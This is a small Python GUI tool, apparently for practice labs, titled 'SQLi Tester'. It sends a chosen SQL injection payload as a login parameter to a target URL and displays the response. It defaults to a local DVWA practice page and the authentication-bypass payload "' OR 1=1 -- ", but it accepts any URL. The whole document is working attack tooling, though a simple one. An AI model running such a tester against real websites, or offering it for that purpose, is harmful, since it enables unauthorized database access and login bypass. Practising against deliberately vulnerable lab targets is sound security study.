pip install requests
import tkinter as tk
import requests

def try_injection():
    target_url = entry_url.get()
    payload = entry_payload.get()
    params = {"user": payload, "pass": "anything"}
    res = requests.get(target_url, params=params)
    text_result.delete("1.0", tk.END)
    text_result.insert(tk.END, res.text[:500])  # 最初の500文字だけ表示

root = tk.Tk()
root.title("SQLi Tester")

tk.Label(root, text="Target URL:").pack()
entry_url = tk.Entry(root, width=50)
entry_url.insert(0, "http://localhost/dvwa/vulnerabilities/sqli/?id=")
entry_url.pack()

tk.Label(root, text="Payload:").pack()
entry_payload = tk.Entry(root, width=50)
entry_payload.insert(0, "' OR 1=1 -- ")
entry_payload.pack()

tk.Button(root, text="Try Injection", command=try_injection).pack()

text_result = tk.Text(root, height=20, width=60)
text_result.pack()

root.mainloop()
